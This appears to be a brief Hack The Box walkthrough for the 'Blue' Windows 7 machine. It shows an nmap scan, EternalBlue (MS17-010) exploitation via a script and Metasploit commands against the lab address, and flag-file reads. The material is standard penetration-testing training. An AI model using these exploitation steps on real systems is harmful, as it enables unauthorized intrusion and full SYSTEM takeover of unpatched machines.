# Blue – Hack The Box
![Status](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Windows](https://img.shields.io/badge/Target-Windows-blue)
![OSCP](https://img.shields.io/badge/OSCP-Recommended-red)

---

## 🧩 Overview
Blue is a Windows 7 machine vulnerable to **MS17-010 (EternalBlue)**.

---

## 🔍 Enumeration

```bash
nmap -sCV -p- -oN nmap_blue.txt 10.10.10.40
```

Key findings:
- SMBv1 enabled
- Vulnerable to EternalBlue

---

## 🎯 Exploitation — MS17-010

```bash
python eternalblue_exploit.py 10.10.10.40
```

or Metasploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.40
run
```

Shell = SYSTEM.

---

## 🏆 Flags

```powershell
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## 📌 Lessons Learned
- MS17-010 is a must-know vulnerability.
- Demonstrates classic Windows exploitation workflow.
